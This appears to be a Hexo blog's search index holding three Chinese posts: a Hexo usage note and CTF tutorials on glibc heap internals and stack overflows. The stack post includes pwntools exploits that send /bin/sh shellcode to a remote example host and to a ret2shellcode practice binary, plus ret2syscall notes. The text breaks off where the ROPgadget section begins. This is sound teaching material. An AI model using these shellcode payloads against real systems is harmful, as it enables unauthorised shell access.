<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/posts/0/</url>
    <content><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><h2 id="1-新建文章"><a href="#1-新建文章" class="headerlink" title="1 新建文章"></a>1 新建文章</h2><p>以hello world为例，在hexo目录下命令行输入<code>hexo new &quot;hello_world&quot;</code>，然后会在source的_posts目录下生成一个hello_world.md文件,在该markdown文件中就可以编辑这篇文章的内容了。编辑完成后刷新博客，博客里便会出现这篇文章，同时hexo也会直接为这篇文章生成一个页面。</p>
<h2 id="2-新建草稿"><a href="#2-新建草稿" class="headerlink" title="2 新建草稿"></a>2 新建草稿</h2><p>hexo默认配置是新建文章，所以如果需要新建一篇草稿，需要输入<code>hexo new draft &quot;文章名称&quot;</code>，然后再source的目录下会生成一个_drafts文件夹，里面会有所有新建的草稿，如果想要预览草稿，可以输入<code>hexo server --draft</code>命令来预览草稿文件</p>
<p>当草稿完成以后，可以通过输入<code>hexo publish &quot;文章名称&quot;</code>来发布草稿，然后这篇草稿会从_drafts中被删除，出现在_posts目录下。</p>
<h2 id="3-删除文章"><a href="#3-删除文章" class="headerlink" title="3 删除文章"></a>3 删除文章</h2><p>删除文章十分简单，只需要把_posts目录下需要删除的markdown删除，然后刷新博客之后这篇文章就不会出现在博客中了。</p>
<p>当然还有更多的教程可以直接去<a href="https://hexo.io/zh-cn/docs/writing.html">官网</a>学习。</p>
]]></content>
  </entry>
  <entry>
    <title>堆基础</title>
    <url>/posts/463ab4ed/</url>
    <content><![CDATA[<h1 id="堆基础知识"><a href="#堆基础知识" class="headerlink" title="堆基础知识"></a>堆基础知识</h1><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。一般称管理堆的那部分程序为堆管理器。不同操作系统对于堆的管理方式不尽相同，以下为ctf比赛中常用的Linux的堆基础知识。</p>
<a id="more"></a>

<h2 id="堆管理的基本结构"><a href="#堆管理的基本结构" class="headerlink" title="堆管理的基本结构"></a>堆管理的基本结构</h2><p>堆的管理主要涉及两个，堆表和堆块。堆区（heap）的内存都以堆块为单位进行分配存储，堆块有堆身和堆首，堆首记录堆块的信息，如大小、是否空闲等，堆身存储数据。堆表一般位于堆区的开始，用于存储所有堆块的重要信息，如大小、是否可用、位置等。</p>
<h3 id="堆块"><a href="#堆块" class="headerlink" title="堆块"></a>堆块</h3><p>在glibc中，堆管理器为<strong>ptmalloc2</strong>。申请堆使用函数malloc,将由malloc申请的内存称为chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p>malloc函数返回对应申请的大小字节的内存块的指针（不包括chunk头）。同时还有异常处理：</p>
<ul>
<li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li>
</ul>
<p>另外，malloc调用时输入的n是用户空间大小，即是堆身大小。</p>
<p>chunk的结构都是统一的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/463ab4ed/RlseGG7.png"></p>
<p>关于INTERNAL_SIZE_T的说明:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of</span></span><br><span class="line"><span class="comment">   chunk sizes.</span></span><br><span class="line"><span class="comment">   The default version is the same as size_t.</span></span><br><span class="line"><span class="comment">   While not strictly necessary, it is best to define this as an</span></span><br><span class="line"><span class="comment">   unsigned type, even if size_t is a signed type. This may avoid some</span></span><br><span class="line"><span class="comment">   artificial size limitations on some systems.</span></span><br><span class="line"><span class="comment">   On a 64-bit machine, you may be able to reduce malloc overhead by</span></span><br><span class="line"><span class="comment">   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int&#x27; at the</span></span><br><span class="line"><span class="comment">   expense of not being able to handle more than 2^32 of malloced</span></span><br><span class="line"><span class="comment">   space. If this limitation is acceptable, you are encouraged to set</span></span><br><span class="line"><span class="comment">   this unless you are on a platform requiring 16byte alignments. In</span></span><br><span class="line"><span class="comment">   this case the alignment requirements turn out to negate any</span></span><br><span class="line"><span class="comment">   potential advantages of decreasing size_t word size.</span></span><br><span class="line"><span class="comment">   Implementors: Beware of the possible combinations of:</span></span><br><span class="line"><span class="comment">     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,</span></span><br><span class="line"><span class="comment">       and might be the same width as int or as long</span></span><br><span class="line"><span class="comment">     - size_t might have different width and signedness as INTERNAL_SIZE_T</span></span><br><span class="line"><span class="comment">     - int and long might be 32 or 64 bits, and might be the same width</span></span><br><span class="line"><span class="comment">   To deal with this, most comparisons and difference computations</span></span><br><span class="line"><span class="comment">   among INTERNAL_SIZE_Ts should cast them to unsigned long, being</span></span><br><span class="line"><span class="comment">   aware of the fact that casting an unsigned int to a wider long does</span></span><br><span class="line"><span class="comment">   not sign-extend. (This also makes checking for negative numbers</span></span><br><span class="line"><span class="comment">   awkward.) Some of these casts result in harmless compiler warnings</span></span><br><span class="line"><span class="comment">   on some systems.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure>

<p>因此，一般为64位的无符整数或32位的</p>
<ul>
<li> prev_size 前一个（物理相邻，较低地址的chunk）的大小，free时有用。包括了chunk头。</li>
<li>size当前chunk的大小，一定是2*size_sz的整数倍，因此最后3位的值对于大小没有影响，从高到低分别表示<ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的</li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。1为被分配，每个chunk创建时都默认置1,为0时表示空闲。</li>
</ul>
</li>
<li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下:<ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适chunk 时挨个遍历。</strong></li>
</ul>
</li>
</ul>
<p><strong>一般情况下</strong>，<strong>物理相邻</strong>的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。（unlink）</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>释放的chunk不会马上归还给系统，ptmalloc会回收统一管理，当之后用户在申请内存时，就会先在这些回收的chunk中尽量找合适的给用户。以避免频繁的系统调用，降低开销。</p>
<p>ptmalloc根据chunk的大小分为4类：fast bins、small bins、large bins、unsorted bin。在每个类中大小相似的会用链表连接起来。</p>
<p><img src="https://img-blog.csdnimg.cn/20190724161429389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些bin对应的数据结构在 malloc_state 中，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;   <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意： malloc_state不在堆段，而是一个全局变量存在数据段中</p>
<p>数组中的 bin 依次如下</p>
<ol>
<li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li>
<li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为<strong>2个机器字长</strong>，即32位相差8字节，64位相差16字节。</li>
<li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的chunk 按 fd 指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</li>
</ol>
<p>此外，上述这些bin的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲chunk不能在一起</strong></p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>对于一些小的chunk释放后<strong>优先</strong>放到fast bin中，为了避免小的chunk和相邻空闲chunk合并，下一次再申请需要堆chunk进行分割的情况。</p>
<p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p>
<p><img src="https://i.imgur.com/KYQmNPN.png" alt="img"></p>
<p>如图所示fastbin的特性有：</p>
<ul>
<li>用单链表维护释放的堆块</li>
<li>链表采用先进后出的方式，最近释放的 chunk 会更早地被分配，所以会更加适合于局部性。</li>
<li>不会对free的chunk进行合并。</li>
</ul>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>mall bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p>
<table>
<thead>
<tr>
<th>下标</th>
<th align="center">SIZE_SZ=4（32位）</th>
<th align="center">SIZE_SZ=8（64位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td align="center">16</td>
<td align="center">32</td>
</tr>
<tr>
<td>3</td>
<td align="center">24</td>
<td align="center">48</td>
</tr>
<tr>
<td>4</td>
<td align="center">32</td>
<td align="center">64</td>
</tr>
<tr>
<td>……</td>
<td align="center">……</td>
<td align="center">……</td>
</tr>
<tr>
<td>63</td>
<td align="center">504</td>
<td align="center">1008</td>
</tr>
</tbody></table>
<p>small bin的特性：</p>
<ul>
<li>采用循环双向链表</li>
<li>采用FIFO</li>
<li>small的free比较特殊。当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中，之后unsorted bin进行整理再添加到对应的bin链上。</li>
<li>与fast bin大小重合的部分，是有可能放入fast bin中的chunk的。</li>
</ul>
<h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p>
<table>
<thead>
<tr>
<th align="left">组</th>
<th align="center">数量</th>
<th align="center">公差</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="center">32</td>
<td align="center">64B</td>
</tr>
<tr>
<td align="left">2</td>
<td align="center">16</td>
<td align="center">512B</td>
</tr>
<tr>
<td align="left">3</td>
<td align="center">8</td>
<td align="center">4096B</td>
</tr>
<tr>
<td align="left">4</td>
<td align="center">4</td>
<td align="center">32768B</td>
</tr>
<tr>
<td align="left">5</td>
<td align="center">2</td>
<td align="center">262144B</td>
</tr>
<tr>
<td align="left">6</td>
<td align="center">1</td>
<td align="center">不限制</td>
</tr>
</tbody></table>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p>
<p>unsorted bin中的chunk处于乱序状态。</p>
<p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p>
<p>特性：</p>
<ul>
<li>unsorted bin是一个由free chunks组成的循环双链表</li>
<li>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中</li>
<li>unsortedbin采用的遍历顺序是FIFO</li>
</ul>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对heap进行扩展后再进行分配。在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p>
<p>需要注意的是，top chunk 的 prev_inuse 比特位始终为1，否则其前面的chunk就会被合并到top chunk中。</p>
<h2 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h2><p>malloc、free函数背后的系统调用主要是(s)brk、mmap、munmap函数。</p>
<p><img src="/posts/463ab4ed/brk&mmap.png" alt="img"></p>
<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p>
<p>brk和sbrk是在Unix和类Unix操作系统中使用的基本内存管理系统调用，用于控制分配给进程数据段的内存量。</p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同</p>
<ul>
<li>不开启ASLR：start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启ASLR：start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li>
</ul>
<p><img src="/posts/463ab4ed/program_virtual_address_memory_space.png" alt="img"></p>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc 会使用 mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出基础</title>
    <url>/posts/c68c5dc4/</url>
    <content><![CDATA[<h1 id="栈溢出基础总结"><a href="#栈溢出基础总结" class="headerlink" title="栈溢出基础总结"></a>栈溢出基础总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h3><p>需要注意的是</p>
<p>函数调用过程中，调用函数的参数在其自身栈帧，即被调用函数的形参。被调用函数栈帧存放自身的局部变量，需要使用参数时，根据偏移向调用函数的栈帧中寻找。</p>
<a id="more"></a>

<p>动态调试一个简单的程序说明问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    c = a+b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    x = fun(a,b);</span><br><span class="line">    <span class="built_in">printf</span>(x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了方便演示，使用gcc编译为32位。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 test.c -g -o test #-g 生成调试信息，-ggdb为生成专属gdb的调试信息。</span><br></pre></td></tr></table></figure>



<p>可以看到，main函数的变量存在main的栈帧中。</p>
<p><img src="/posts/c68c5dc4/image-20201030201951676.png" alt="image-20201030201951676"></p>
<p>在调用的fun函数中，使用a，b时向main的栈帧访问。</p>
<p><img src="/posts/c68c5dc4/image-20201030202426288.png" alt="image-20201030202426288"></p>
<h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX即No-eXecute（不可执行）的意思，NX enable意味着栈不可执行。</p>
<h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>开启canary后的栈结构，其中canary不一定在rbp-8的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中rbp-0x8（通过这个汇编代码可以判断canary插入入位置） 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>

<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用栈溢出漏洞劫持执行流，让程序执行写入的shellcode。</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+将shellcode放入可执行的段中</p>
<h3 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h3><h4 id="pwntools的shellcode生成"><a href="#pwntools的shellcode生成" class="headerlink" title="pwntools的shellcode生成"></a>pwntools的shellcode生成</h4><p>利用pwntools的shellcraft模块可方便的生成shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>)</span><br><span class="line"><span class="comment"># EXPLOIT CODE GOES HERE</span></span><br><span class="line">r.send(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#shellcraft.sh()是执行/bin/sh的shellcode。不使用设置的环境可改为shellcraft.amd64.linux.sh()</span></span><br><span class="line"><span class="comment">#asm()函数接收一个字符串作为参数，得到汇编码的机器代码。</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>根据攻击的目标机通过context设置环境变量</p>
<ul>
<li><strong><em>arch</em></strong>设置架构类型</li>
<li><strong><em>os</em></strong>设置操作系统</li>
<li><strong><em>log_level</em></strong>设置日志级别，常设为debug</li>
</ul>
<h4 id="exploit-db"><a href="#exploit-db" class="headerlink" title="exploit-db"></a><a href="https://www.exploit-db.com/">exploit-db</a></h4><p>pwntools可以生成一些简单、常规的shellcode。对于特殊要求的可以在exploit-db中查找。</p>
<h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><p>ida反编译结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets函数明显的存在栈溢出。strncpy函数将输入复制给buf2.用ida可以看到buf2在bss段，大小为0x64.</p>
<p><img src="/posts/c68c5dc4/image-20201031111332809.png" alt="image-20201031111332809"></p>
<p>在gdb调试中使用vmmap，查看各段</p>
<p><img src="/posts/c68c5dc4/image-20201031111751831.png" alt="image-20201031111751831"></p>
<p>bss段有可执行权限。</p>
<p>exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>注意一点，这里ida显示的v4与ebp的偏移是0x64，实际上不准确。</p>
<p>在调试中，可以看到，v4相对esp的偏移是0x1c,esp为0xffffce00，所以v4为0xffffce1c。与ebp的偏移是0x6c。所以溢出到ret的数据一共是0x6c+4（112）。</p>
<p><img src="/posts/c68c5dc4/image-20201031113605999.png" alt="image-20201031113605999"></p>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>直接使用系统调用来获得shell。即通过一系列的gadgets，将各个寄存器置为系统调用需要的参数，然后执行int 0x80即可。</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+足够的gadgets。在没法写入可执行的shellcode的时候考虑。</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p>
<ol>
<li>应用程序调用库函数（API）；</li>
<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
<li>中断处理函数返回到 API 中；</li>
<li>API 将 EAX 返回给应用程序。</li>
</ol>
<p>应用程序调用系统调用的过程是：</p>
<ol>
<li>把系统调用的编号存入 EAX；</li>
<li>把函数参数存入其它通用寄存器；</li>
<li>触发 0x80 号中断（int 0x80）。</li>
</ol>
<p>最常见的系统调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>寄存器的状态为</p>
<ul>
<li>eax为系统调用号，0xb</li>
<li>ebx为第一个参数，即指向字符串”/bin/sh”的地址</li>
<li>ecx、edx应为0</li>
</ul>
<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>使用ROPgadget来寻找所需要的gadgets。</p>
<p>关于ROPgadget的使用</p>
